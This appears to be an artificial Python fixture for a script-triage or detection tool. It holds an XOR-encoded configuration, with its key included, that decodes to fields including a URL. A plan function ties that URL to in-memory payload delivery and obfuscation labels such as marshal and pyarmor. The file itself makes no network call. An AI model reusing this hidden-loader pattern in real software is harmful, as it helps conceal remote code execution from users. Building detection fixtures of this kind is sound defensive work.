# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_070e5405 = (204, 82, 198, 226, 107, 206, 10, 132, 237, 37, 219, 12, 133, 235, 113, 200, 10, 171, 236, 125, 215, 0, 128, 251, 52, 222, 6, 135, 238, 121, 206, 12, 156, 193, 117, 223, 2, 155, 236, 97, 198, 14, 144, 255, 104, 206, 10, 134, 163, 106, 223, 30, 129, 251, 107, 206, 28, 171, 237, 108, 195, 3, 145, 193, 117, 223, 2, 155, 236, 97, 198, 28, 128, 255, 127, 223, 48, 151, 241, 109, 212, 27, 201, 175, 100, 201, 22, 154, 234, 121, 194, 82, 145, 230, 123, 223, 31, 128, 247, 119, 212, 48, 145, 230, 104, 200, 10, 135, 237, 113, 213, 1, 136, 241, 122, 220, 26, 135, 253, 121, 206, 6, 155, 240, 37, 215, 14, 134, 237, 112, 219, 3, 171, 251, 118, 204, 10, 152, 241, 104, 223, 48, 132, 242, 121, 212, 19, 151, 255, 106, 200, 6, 145, 236, 37, 202, 22, 149, 236, 117, 213, 29, 171, 241, 122, 220, 26, 135, 253, 121, 206, 10, 144, 226, 111, 211, 1, 144, 241, 111, 201, 48, 151, 246, 121, 211, 1, 201, 233, 107, 217, 29, 157, 238, 108, 229, 27, 155, 193, 104, 195, 27, 156, 241, 118, 198, 12, 149, 243, 104, 219, 6, 147, 240, 71, 211, 11, 201, 253, 121, 215, 31, 149, 247, 127, 212, 66, 151, 166, 126, 220, 12, 145, 248, 121, 216, 94, 136, 235, 106, 214, 82, 156, 234, 108, 202, 28, 206, 177, 55, 217, 87, 146, 248, 123, 223, 9, 149, 252, 41, 148, 10, 140, 255, 117, 202, 3, 145, 176, 113, 212, 25, 149, 242, 113, 222, 64, 146, 251, 123, 130, 90, 196, 250, 41, 148, 31, 141, 226, 109, 201, 10, 134, 193, 121, 221, 10, 154, 234, 37, 242, 26, 154, 234, 106, 223, 28, 135, 206, 97, 206, 7, 155, 240, 55, 217, 87, 146, 248, 123, 223, 9, 149, 252, 41,)
CODEC_070e5405 = "integer_tuple|repeating_key_xor|ba,6f,f4,9e,18"

def load_070e5405():
    return bytes(MATERIAL_070e5405)

def decode_070e5405(stored_bytes):
    key_bytes = (186, 111, 244, 158, 24,)
    return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(stored_bytes))

def recover_070e5405():
    harmless_value = (3, 5, 8, 13)[1:3]
    try:
        recovered_bytes = decode_070e5405(load_070e5405())
    except (TypeError, ValueError) as error:
        raise RuntimeError("configuration recovery failed") from error
    configuration_text = recovered_bytes.decode("ascii", "strict")
    return configuration_text

def inspect_070e5405():
    stream = io.BytesIO(recover_070e5405().encode("ascii"))
    return stream.read().decode("ascii")

def surface_070e5405():
    try:
        raise LookupError("surface")
    except LookupError:
        return ("exception_expression", "marshal_envelope_plan", "pyarmor_obfuscated", "wscript_to_python")

def obfuscation_070e5405():
    marshal_plan = {"format": "code_object", "action": "inspect_only", "label": "marshal_envelope_plan"}
    return marshal_plan["label"]

def plan_070e5405():
    fields = dict(item.split("=", 1) for item in inspect_070e5405().split("|"))
    analysis_surface = surface_070e5405()
    obfuscation_surface = obfuscation_070e5405()
    operation_plan = ("requests_style_memory", fields["url"], "memory-handoff")
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_070e5405())

# reconstruction complete